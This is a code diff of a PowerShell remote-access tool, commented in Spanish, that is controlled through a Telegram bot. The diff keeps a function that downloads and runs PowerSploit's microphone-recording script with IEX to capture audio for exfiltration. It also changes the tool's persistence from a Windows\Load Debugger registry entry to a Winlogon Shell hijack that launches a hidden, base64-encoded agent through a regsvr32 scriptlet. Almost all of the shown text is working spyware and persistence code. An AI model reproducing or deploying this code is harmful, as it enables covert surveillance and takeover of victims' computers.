@@ -151,16 +151,6 @@ bot-send -photo $ruta -botkey $botkey -chat_id $chat_id
 
 }
 
-function Add-Registro
-{
-    [CmdletBinding()] Param(
-        [Parameter(Position = 0, Mandatory = $False)]
-        [String]$code 
-    )
-    New-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\Load"
-    Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\Load" -Name Debugger -Value $code -Force
-}
-
 
 function graba-audio { param ($botkey,$chat_id,$segundos)
 IEX (curl "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-MicrophoneAudio.ps1").content #### Grabar Audio
@@ -220,9 +210,9 @@ function persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {$texto = "Sorry, necesitas privilegios"; return $texto;break }  else {
 $agent_bot = create_agent -botkey $botkey -chat_id $chat_id;  $agent_bot = $agent_bot -replace "con bypassuac :D","" ; $code = code_a_base64 -code $agent_bot; $code = "powershell.exe -win hidden -enc " + $code
-$plantilla_sct =  (crea_plantilla_sct -code $code); $plantilla_sct | Out-File -Encoding ascii "C:\Users\Public\Libraries\log2.sct" 
-Add-Registro -code "c:\windows\system32\regsvr32.exe /s /n /u /i:C:\Users\Public\Libraries\log2.sct scrobj.dll" | out-null ; $texto = ""
-$texto = "Persistencia ejecutada correctamente"} return $texto;break}
+$plantilla_sct =  (crea_plantilla_sct -code $code); $plantilla_sct | Out-File -Encoding ascii "C:\Users\Public\Libraries\log2.sct" ;
+Set-ItemProperty "registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name Shell -value "explorer.exe,c:\windows\system32\regsvr32.exe /s /n /u /i:C:\Users\Public\Libraries\log2.sct scrobj.dll"
+$texto = "" ; $texto = "Persistencia ejecutada correctamente"} return $texto;break}
 
 
 
@@ -230,10 +220,11 @@ function remove-persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {$texto = "Sorry, necesitas privilegios";return $texto; break }  
 else {
-$key = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\Load" ;$check = Get-ItemProperty $key -name Debugger | Select-String "regsvr32.exe"
+$key = "registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" ;$check = Get-ItemProperty $key -name Shell | Select-String "regsvr32.exe"
 if ($check.count -eq 0) {$texto = "Todo correcto! parece estar limpio el arranque"; return $texto; break} else {
 $texto = "Eliminando persistencia"
-remove-item $key ; remove-item $key2
+Set-ItemProperty "registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name Shell -value "explorer.exe"
+
 Remove-Item C:\Users\Public\Libraries\log2.sct; return $texto; break
 }}}
 
